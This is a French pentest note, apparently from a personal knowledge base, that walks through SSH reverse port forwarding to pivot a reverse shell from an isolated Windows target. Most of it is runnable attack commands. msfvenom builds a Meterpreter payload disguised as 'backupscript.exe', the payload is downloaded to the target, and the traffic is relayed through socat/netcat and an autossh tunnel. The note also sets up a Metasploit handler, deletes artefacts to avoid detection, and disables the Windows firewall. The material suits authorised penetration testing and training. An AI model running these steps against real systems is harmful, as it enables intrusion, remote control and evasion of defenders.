## Remote/Reverse Port Forwarding avec SSH

Ce processus permet d'établir une connexion depuis une cible isolée vers une machine attaquante en utilisant un serveur pivot.

```mermaid
flowchart LR
    A[Kali Attaquant] -- SSH Tunnel -R 8080:8000 --> B[Serveur Pivot Ubuntu]
    B -- Port 8080 --> C[Cible Windows]
    C -- Reverse Shell --> B
    B -- Tunnel --> A
```

## Contexte

Le **Remote Port Forwarding** est utilisé lorsque la cible ne peut pas communiquer directement avec l'attaquant. Le serveur pivot agit comme un relais pour faire transiter le trafic.

> [!danger] Risque de détection
> L'exécution de binaires non signés comme **msfvenom** peut déclencher des alertes EDR sur la cible.

> [!warning] Configuration SSH
> Vérifier les droits SSH sur le pivot, notamment la directive **AllowTcpForwarding** dans `/etc/ssh/sshd_config`.

## Génération du payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP_Ubuntu> LPORT=8080 -f exe -o backupscript.exe
```

> [!info] Importance du LHOST
> Le **LHOST** doit correspondre à l'adresse IP du serveur pivot, car c'est lui qui reçoit la connexion initiale de la cible.

## Transfert de fichiers

```bash
scp backupscript.exe ubuntu@<IP_Ubuntu>:~/
```

## Serveur web temporaire

Sur le serveur pivot, héberger le binaire pour le téléchargement :

```bash
cd ~
python3 -m http.server 8123
```

Sur la cible Windows, récupérer le fichier :

```powershell
Invoke-WebRequest -Uri "http://<IP_Ubuntu>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## Tunneling SSH

Établir le tunnel depuis la machine attaquante vers le pivot :

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<IP_Ubuntu> -vN
```

> [!warning] Sécurité du binding
> L'utilisation de **0.0.0.0** dans le tunnel SSH expose le port d'écoute sur toutes les interfaces du pivot. Restreindre à **127.0.0.1** si possible.

## Persistance du tunnel (autossh)

Pour garantir la résilience du tunnel face aux instabilités réseau ou aux timeouts SSH, l'utilisation d'**autossh** est recommandée.

```bash
autossh -M 0 -f -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -R 8080:127.0.0.1:8000 ubuntu@<IP_Ubuntu>
```

> [!tip] Gestion des timeouts
> Les options **ServerAliveInterval** et **ServerAliveCountMax** permettent de détecter une connexion rompue et de forcer la reconnexion automatique.

## Gestion des erreurs de connexion (firewall/ACL)

Si la connexion échoue, vérifier les restrictions réseau sur le pivot et la cible.

| Problème | Action |
| :--- | :--- |
| **SSH Port Refused** | Vérifier `sshd` sur le pivot (`systemctl status ssh`) |
| **Connection Timeout** | Vérifier les règles `iptables` ou `ufw` sur le pivot |
| **Permission Denied** | Vérifier `AllowTcpForwarding yes` dans `/etc/ssh/sshd_config` |

```bash
# Vérification des règles de filtrage sur le pivot
sudo iptables -L -n -v
```

## Alternative sans Metasploit (socat/netcat)

En environnement restreint ou pour éviter les signatures **Metasploit**, utiliser **socat** pour le relayage.

Sur l'attaquant :
```bash
nc -lvnp 8000
```

Sur le pivot (si socat est présent) :
```bash
socat TCP-LISTEN:8080,fork TCP:<IP_Attaquant>:8000
```

Ceci permet de rediriger le trafic entrant sur le port 8080 du pivot directement vers le listener **netcat** sur la machine attaquante. Voir les techniques de **Living off the Land Techniques**.

## Listener Metasploit

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

## Exécution et vérification

Sur la cible Windows :

```powershell
C:\backupscript.exe
```

Sur la machine attaquante, vérifier la réception de la session :

```bash
sessions -i 1
meterpreter > shell
```

## Nettoyage des traces (post-exploitation)

Il est impératif de supprimer les artefacts pour éviter la détection lors d'un audit de sécurité.

```powershell
# Suppression du binaire sur la cible
del C:\backupscript.exe

# Fermeture des sessions SSH sur le pivot
pkill -f autossh
# Ou via la machine attaquante
ssh -O exit ubuntu@<IP_Ubuntu>
```

> [!note] Notes liées
> * **SSH Pivoting**
> * **Metasploit Framework**
> * **Living off the Land Techniques**
> * **Network Enumeration**

## Dépannage et maintenance

| Commande | Utilité |
| :--- | :--- |
| `netstat -tulnp \| grep 8080` | Vérifier l'écoute sur le pivot |
| `netstat -tulnp \| grep 8000` | Vérifier l'écoute sur Kali |
| `netsh advfirewall set allprofiles state off` | Désactiver temporairement le pare-feu Windows |